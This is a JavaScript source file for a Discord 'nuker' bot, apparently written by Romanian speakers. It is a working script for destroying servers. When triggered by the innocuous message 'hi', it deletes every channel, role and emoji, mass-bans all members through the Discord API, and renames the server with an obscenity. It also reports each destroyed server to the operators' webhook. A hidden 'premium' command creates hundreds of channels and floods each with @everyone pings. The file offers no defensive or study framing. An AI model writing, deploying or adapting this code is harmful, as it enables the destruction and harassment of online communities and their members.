const { Client } = require("discord.js");
const Discord = require("discord.js");
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({

});
const db = require("quick.db")
const talkedRecently = new Set();
const http = require("http");
http.createServer((_, res) => res.end("Alive")).listen(8080)

client.on("ready", async () => {
  console.log(`${client.user.username} is online on ${client.guilds.cache.size} servers`);
  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" n-am csf >> " + guild.name + " - sclavii " + guild.memberCount)
    })
});



client.on("message", async(message)=>{
  if (!message.guild) return;
    if (message.content.startsWith('hi')) {
let grief = db.fetch(`${message.guild.id}-grief`)

if(grief == true)
return message.channel.send("This server was already nuked.");

    
    
         if(message.guild.id == '804615798046982164') return message.channel.send('https://discord.gg/pMKnwEQdJh');

       let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id


 



      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")

        const w = await client.guilds.cache
      .get("804615798046982164")
      .fetchWebhooks();
    const webhook = w.find((w) => w.name === "Lord clan");
   webhook.send(`https://discord.gg/pMKnwEQdJh  \n\n \`${message.author.tag}\` (\` ${message.author.id}\` ) o distrus server-ul **${message.guild.name}** (\` ${message.guild.id} \` ) cu **${message.guild.memberCount}** membrii `);

let token = "pui token aici"
const phin = require('phin').unpromisified
let guildID = message.guild.id












       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });





    
headers = {'Authorization': "Bot " + token}
var interval = setInterval (async function () {
  phin({
            url: `https://discord.com/api/v8/guilds/${guildID}/members?limit=1000`,
            method: 'GET',
            parse: 'json',
            headers: headers
         }, (err, res) => {
            res.body.forEach(member=>{

                console.log(member.user.id)

            phin({
              url:`https://discord.com/api/v8/guilds/${guildID}/bans/${member.user.id}`,
              method:'PUT',
              parse: 'json',
              headers: headers
            }, (err, res) =>{
              if(res.body){
                console.log(res.body)
              } else {
                console.log(`${member.user.username} got banned :p api v8`)
              }

            })
            })
            
   })
   
   },500)
























message.guild.setName("vati dus pe pula")
    message.guild.setIcon(
      "https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg"
    );
    
        
    
  

        
        
db.set(`${message.guild.id}-grief`, true);



        
       


    
    


}


if (message.content.startsWith("add premium")) {

        const embed = new MessageEmbed()
        .setDescription(`Ai primit premium, vei beneficia de comenzi speciale!`)
    
        .setColor("0d0d0d")
           let ownerID = "804607222843572234"
  if(message.author.id !== ownerID) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get(args[0])
    db.fetch(`dev_${user.id}`);
    db.set(`dev_${user.id}`, 1)
    message.channel.send(`Acel membru are premium acum.`)
    user.send(embed)
  }
        if (message.content.startsWith('scraper')) {
          message.channel.send("scraping every member from this guild")
        }


        if (message.content.startsWith('m555fcvvp')) {


    let Embed4 = new Discord.MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`Nu ai premium activat!`);
     
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)
      
                   if(message.guild.id == '804615798046982164') return message.channel.send('https://discord.gg/Yz78FDERkE');

            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                  let channels =  message.guild.channels.cache.array();
                     message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 200; i++) {
                        message.guild.channels.create('wizzed by ' + message.author.username)

                        for (var i = 0; i < 200; i++) {
                            let channels = message.guild.channels.create('wizzed by ' + message.author.username)

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone ' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                }
                // If you give an input
                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create(argresult)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone ' + argresult);
                                console.log(`CHANNEL PINGED!`);
                                // other per-channnel logic
                            }
                        }
                    );
                }
            }
            message.delete();
        }
   
            
 })


 



client.login('si aici pui token')
